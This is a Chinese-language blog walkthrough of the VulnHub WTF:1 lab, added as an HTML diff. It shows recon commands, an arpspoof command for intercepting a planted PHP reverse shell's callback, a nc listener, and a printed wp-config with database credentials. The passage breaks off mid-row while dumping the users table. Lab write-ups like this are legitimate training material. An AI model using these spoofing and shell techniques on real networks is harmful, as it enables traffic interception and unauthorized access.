@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>VulnHub通关日记-WTF_1-Walkthrough，MITM中间人攻击拿到Flag | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">VulnHub通关日记-WTF_1-Walkthrough，MITM中间人攻击拿到Flag</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">February 11, 2020&nbsp;&nbsp;11:07:15</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Vulnhub/">Vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=470795330&auto=1&height=66"></iframe>
+
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/940.png" alt="图片"></p>
+<p>Name：WTF:1<br>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/wtf-1,399/">https://www.vulnhub.com/entry/wtf-1,399/</a><br>Level：intermediate machine<br>Task：拿到 <code>/root/flag.txt</code> 文件<br>其中作者给了我们一点提示：Remember, good enumeration!（意思就是告诉我们要用枚举爆破）<br>注意：我在玩这个靶机的时候用了两天，其中配置网络原因导致本文章的靶场IP变换了几次，从最初的<code>192.168.0.15</code>再到<code>192.168.1.130</code>，大家明白就好！</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到靶机的第一时间先探测一下靶机的 <code>IP</code> ：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/941.png" alt="图片"></p>
+<p>获取到靶机到 <code>IP</code> 为 <code>192.168.0.15</code> ，接下来使用 <code>NMAP</code> 对 <code>IP</code> 进行端口探测：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 192.168.0.15</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/942.png" alt="图片"></p>
+<p>发现它开放了 <code>22</code>（ssh）和 <code>80</code>（http）端口，入侵点有点少，估计就在 <code>80</code> 端口了。打开它的 <code>web</code> 页面没有啥可利用的信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.15/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/943.png" alt="图片"></p>
+<p>那么还是老规矩，扫一扫它的目录文件来看看：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/944.png" alt="图片"></p>
+<p>发现了一个 <code>zhkh</code> 的目录，打开非常卡，而且发现它的请求是 <code>192.168.1.13</code> 这个 <code>ip</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.15/zhkh/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/945.png" alt="图片"></p>
+<p>等了 N 久之后发现页面是乱的，估计是网络问题没有加载完：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/946.png" alt="图片"></p>
+<p>通过问组长 <code>Ins1ght</code> 大佬说可以使用 <code>Burpsuite</code> 里的 <code>Options</code> 设置可以替换掉我们代理的 <code>192.168.0.15</code> 这个靶场 <code>IP</code>，因为返回包里提示了这个：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/947.png" alt="图片"></p>
+<p>所以我们利用 <code>Burpsuite</code> 把它替换为 <code>192.168.1.13</code> ：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/948.png" alt="图片"></p>
+<p>这个时候我们再来访问网站就会很快了而且返回的页面是正常的：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/949.png" alt="图片"></p>
+<p>翻了一下页面发现它的 CMS 是 <code>Wordpress</code>，接着拿 <code>Wpscan</code> 一顿梭哈，发现了它的版本是 <code>Wordpress5.3</code>，而且没有啥可利用点：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/950.png" alt="图片"></p>
+<p> 那么继续信息搜集，用 <code>gobuster</code> 扫它的目录文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir --url http://192.168.0.15/zhkh/wp-content/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .php,.txt,.html,.zip,.rar</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/951.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">===============================================================</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/themes (Status: 301)</span><br><span class="line">/uploads (Status: 301)</span><br><span class="line">/plugins (Status: 301)</span><br><span class="line">/upgrade (Status: 301)</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
+
+<p> 其他文件没啥用，有用的就是 <code>/uploads</code> 这个目录，打开后是一个目录遍历：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/952.png" alt="图片"></p>
+<p>我们来到 <code>uigen_2019</code> 这个目录下发现有一个 <code>shell.php</code> 文件引起了我的注意：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/953.png" alt="图片"></p>
+<p>通过 <code>Burpsuite</code> 抓包发现响应包有错误信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WARNING: Failed to daemonise.  This is quite common and not fatal.</span><br><span class="line">Connection timed out (110)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/954.png" alt="图片"></p>
+<p>后来通过去 Google 搜索了一下 <code>Response</code> 发现了这个：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/955.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/956.png" alt="图片"></p>
+<h2 id="wireShark捕获脚本木马信息"><a href="#wireShark捕获脚本木马信息" class="headerlink" title="wireShark捕获脚本木马信息"></a>wireShark捕获脚本木马信息</h2><p>通过大致的看了看代码它使用的是<code>反向</code>连接的 <code>shell</code>，也就是我们监听一个端口和IP，目标运行 <code>shell.php</code> 这个文件，然后我们就得到了一枚shell，这就是反向。</p>
+<p>但是问题来了，我们不知道这个 <code>shell.php</code> 里的端口和 <code>IP</code> 是多少。这个时候我问了一下组长它说让我使用 <code>wireShark</code> 抓包分析一下然后利用 <code>MITM</code>（中间人攻击）。</p>
+<p>那么先用 <code>wireShark</code> 抓包分析一下 <code>eth0</code> 这个网卡的流量吧，打开 <code>wireShark</code> 后捕获到一个有关于靶机（192.168.0.15）的 <code>TCP</code> 数据包：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/957.png" alt="图片"></p>
+<p>这个流量的意思是这样的：<code>wireShark</code> 捕获到靶机（192.168.0.15）这个<code>源IP</code> 地址向 <code>Destination</code>（192.168.1.14）目的 IP 地址发送<code>TCP</code>请求。通过查看这条数据包发现源端口是 <code>51234</code>，目的端口是 <code>5555</code>。</p>
+<p>因此分析后得知我们需要让我们的 <code>IP</code> 变为 <code>192.168.1.14</code>，然后监听 <code>5555</code> 端口就可以得到一枚 <code>shell</code>！</p>
+<h2 id="MITM中间人ARP攻击得到shell"><a href="#MITM中间人ARP攻击得到shell" class="headerlink" title="MITM中间人ARP攻击得到shell"></a>MITM中间人ARP攻击得到shell</h2><p>有关<code>ARP</code>和<code>MITM</code>的文章可以看看这些：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/LittleHann/p/3735816.html</span><br><span class="line">https://www.cnblogs.com/LittleHann/p/3735602.html</span><br></pre></td></tr></table></figure>
+
+<p>这个时候就可以利用 <code>ARP</code> 欺骗来告诉靶机（192.168.1.130）我 <code>KALI</code> 这台主机的 <code>IP</code> 为 <code>192.168.1.14</code>，从而利用 <code>ARP</code> 协议让 KALI 的 <code>MAC</code> 地址和 <code>192.168.1.14</code> 相同，造成这么一个 <code>ARP</code> 欺骗！</p>
+<p>我先是在我KALI中添加了一个新的网卡：<code>eth1</code>，然后只设置它的<code>IP</code>、<code>子网掩码</code>、网关不需要设置：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/958.png" alt="图片"></p>
+<p>设置好后重启网络发现多了一个网卡 <code>eth1</code> ，其中<code>IP</code>为<code>192.168.1.14</code>:</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/959.png" alt="图片"></p>
+<p>这个时候再配置 KALI 的 <code>IP</code> 转发功能，把 <code>ip_forward</code> 的默认值 <code>0</code> 修改为 <code>1</code>:</p>
+<p>然后 <code>nc</code> 监听 <code>5555</code> 端口、访问 <code>shell.php</code> ，随后进行 <code>arp</code> 欺骗攻击得到一枚<code>shell</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.1.130 192.168.1.14</span><br><span class="line">注释：-i 指定网卡 -t 要arp欺骗的ip，第一个IP是告诉目标IP我们kali的IP为192.168.1.14</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/960.png" alt="图片"></p>
+<p>这个时候就通过<code>MITM</code>成功的获取到一枚shell！这里多亏队员 <code>Ironman_24</code> 大佬的提示！感谢！！！</p>
+<h3 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h3><p>我在我 <code>MAC</code> 的 <code>WMware</code> 添加了一个新的网卡，<code>VMware2</code>，随后修改了一下 <code>KALI</code> 的 <code>静态IP</code> ：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/961.png" alt="图片"></p>
+<p>设置完后重启网络：<code>/etc/init.d/networking restart</code> ，这个时候 <code>ip</code> 就更改成功了：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/962.png" alt="图片"></p>
+<p>接着访问 <code>http://192.168.1.130/zhkh/wp-content/uploads/uigen_2019/shell.php</code> ,然后 <code>nc</code> 监听 <code>5555</code> 端口得到了一枚 shell：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/963.png" alt="图片"></p>
+<p>看了看权限只是一个普通的网站权限：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/964.png" alt="图片"></p>
+<p>我们先让它得到一个 <code>bash</code> 的 shell 把：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/965.png" alt="图片"></p>
+<p>来到了网站根目录下找到了 <code>Wordpress</code> 的配置文件：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/966.png" alt="图片"></p>
+<p>发现了 <code>Mysql</code> 的连接信息：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&lt;</span>?php</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The base configuration for WordPress</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The wp-config.php creation script uses this file during the</span></span><br><span class="line"><span class="comment"> * installation. You don&#x27;t have to use the web site, you can</span></span><br><span class="line"><span class="comment"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This file contains the following configurations:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * * MySQL settings</span></span><br><span class="line"><span class="comment"> * * Secret keys</span></span><br><span class="line"><span class="comment"> * * Database table prefix</span></span><br><span class="line"><span class="comment"> * * ABSPATH</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @link https://codex.wordpress.org/Editing_wp-config.php</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @package WordPress</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> <span class="operator">*</span><span class="operator">*</span> MySQL settings <span class="operator">-</span> You can <span class="keyword">get</span> this info <span class="keyword">from</span> your web host <span class="operator">*</span><span class="operator">*</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="comment">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wp_database&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database username */</span></span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;ra&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database password */</span></span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;912391929129&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL hostname */</span></span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database Charset to use in creating database tables. */</span></span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;DB_CHARSET&#x27;</span>, <span class="string">&#x27;utf8mb4&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The Database Collate type. Don&#x27;t change this if in doubt. */</span></span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/**#@+</span></span><br><span class="line"><span class="comment"> * Authentication Unique Keys and Salts.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Change these to different unique phrases!</span></span><br><span class="line"><span class="comment"> * You can generate these using the &#123;@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span></span><br><span class="line"><span class="comment"> * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @since 2.6.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;AUTH_KEY&#x27;</span>,         <span class="string">&#x27;hmdNSrpLV5we) E$0_/E,$Vxr0%&lt;S&#123;]D@)T+rc%a7wvbr)Q|bm7boJdOz/AN&gt;/#&amp;&#x27;</span> );</span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="string">&#x27;DR&amp;l3&gt;0z8mmFT+Y&#125;#bqND_~H;wb[r|:te+tN%:K PS7=~~/;uA5)zj~Z%tu&#125;-8UJ&#x27;</span> );</span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="string">&#x27;7+cns%lA?p60U~*(J,z9zp4w 2%hB1S6jZ0NuUgl(oK,#H6&amp;GL,i@+4m:1w3|-aW&#x27;</span> );</span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;NONCE_KEY&#x27;</span>,        <span class="string">&#x27;m5,d=I4 MShd4lU#8F@@oj2cKpc+J[Kp3bRt%Sfuw.%#`oVKzgDMTl5+D[nu,R&lt;K&#x27;</span> );</span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;AUTH_SALT&#x27;</span>,        <span class="string">&#x27;sl3w_.&#125;n|M&#123;~D#6,v]U?Kz/,k&amp;oCnn1._|(i3Y|ng7+&lt;-f4Nv7mmR4B&lt;i&gt;!?du#i&#x27;</span> );</span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;b&gt;,[La8I5xqchTMvXN-bI8%[)-V[wHjNmj/1jZ_Vnq`q0&lt;|E@6^.8~KpI_#53Rw_&#x27;</span> );</span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;v_`E=EA]$UBa.2P|%YV4cl&#125;(c@AVkW$V5959/gQL~a:,O&#125;qfG85Xc4)=xRBux6g?&#x27;</span> );</span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;TE#Tim,4h|zKYm$he[F%J*4vG&#123;v]VK!jP0sSeBLHp7Mp|P*XJz:=&amp;n&lt;nsfbIFq&gt;a&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/**#@-*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * WordPress Database Table prefix.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * You can have multiple installations in one database if you give each</span></span><br><span class="line"><span class="comment"> * a unique prefix. Only numbers, letters, and underscores please!</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$table_prefix <span class="operator">=</span> <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * For developers: WordPress debugging mode.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Change this to true to enable the display of notices during development.</span></span><br><span class="line"><span class="comment"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span></span><br><span class="line"><span class="comment"> * in their development environments.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * For information on other constants that can be used for debugging,</span></span><br><span class="line"><span class="comment"> * visit the Codex.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @link https://codex.wordpress.org/Debugging_in_WordPress</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;WP_DEBUG&#x27;</span>, <span class="literal">false</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/* That&#x27;s all, stop editing! Happy publishing. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Absolute path to the WordPress directory. */</span></span><br><span class="line">if ( <span class="operator">!</span> defined( <span class="string">&#x27;ABSPATH&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="keyword">define</span>( <span class="string">&#x27;ABSPATH&#x27;</span>, dirname( __FILE__ ) . <span class="string">&#x27;/&#x27;</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Sets up WordPress vars and included files. */</span></span><br><span class="line">require_once( ABSPATH . <span class="string">&#x27;wp-settings.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>`Db]f&#123;He3HgO`(z</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/967.png" alt="图片"></p>
+<p>尝试登陆 <code>Mysql</code> 登陆成功，通过在数据库里查看管理员的账户密码发现密码是加密加盐了的：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [wp_database]<span class="operator">&gt;</span> <span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"><span class="operator">|</span> Tables_in_wp_database <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"><span class="operator">|</span> wp_commentmeta        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> wp_comments           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> wp_links              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> wp_options            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> wp_postmeta           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> wp_posts              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> wp_term_relationships <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> wp_term_taxonomy      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> wp_termmeta           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> wp_terms              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> wp_usermeta           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> wp_users              <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"><span class="number">12</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [wp_database]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> wp_users;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> wp_users;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------+------------------------------------+---------------+------------+----------+---------------------+---------------------+-------------+--------------+</span></span><br><span class="line"><span class="operator">|</span> ID <span class="operator">|</span> user_login <span class="operator">|</span> user_pass                          <span class="operator">|</span> user_nicename <span class="operator">|</span> user_email <span class="operator">|</span> user_url <span class="operator">|</span> user_registered     <span class="operator">|</span> user_activation_key <span class="operator">|</span> user_status <span class="operator">|</span> display_name <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------+------------------------------------+---------------+------------+----------+---------------------+---------------------+-------------+--------------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> admin      <span 